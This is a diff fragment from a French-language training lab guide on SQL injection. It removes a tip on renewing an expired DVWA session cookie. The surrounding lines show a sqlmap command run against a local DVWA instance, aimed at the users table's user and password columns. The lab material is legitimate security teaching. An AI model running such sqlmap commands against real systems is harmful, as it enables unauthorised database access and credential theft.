@@ -762,16 +762,9 @@ Au lieu de `1` (un seul utilisateur normalement). Le flag `-b` envoie le cookie 
 1. Lancer sqlmap sur le point d'injection détecté
 2. Cibler la base `dvwa`, la table `users`, les colonnes `user,password`
 
-> 🔄 **Cookie expiré (HTTP 302) ?** Le cookie DVWA expire après quelques minutes. Pas besoin de refaire le LAB-2 — renouvelez-le avec :
-> ```bash
-> source env.sh && bash labs_resolution/jour-01/setup_dvwa.sh
-> ```
-> Ceci écrase `/tmp/dvwa_cookie.txt` avec un cookie frais (login + `security=low`).
-
 **Commande :**
 ```bash
 cd rendu_labs/jour-01
-# 🔄 Si cookie expiré, renouvelez-le d'abord (voir note ci-dessus)
 SESSID=$(grep PHPSESSID /tmp/dvwa_cookie.txt | awk '{print $NF}')
 sqlmap -u "http://localhost:8088/vulnerabilities/sqli/?id=1&Submit=Submit" \
   --cookie="security=low; PHPSESSID=$SESSID" \
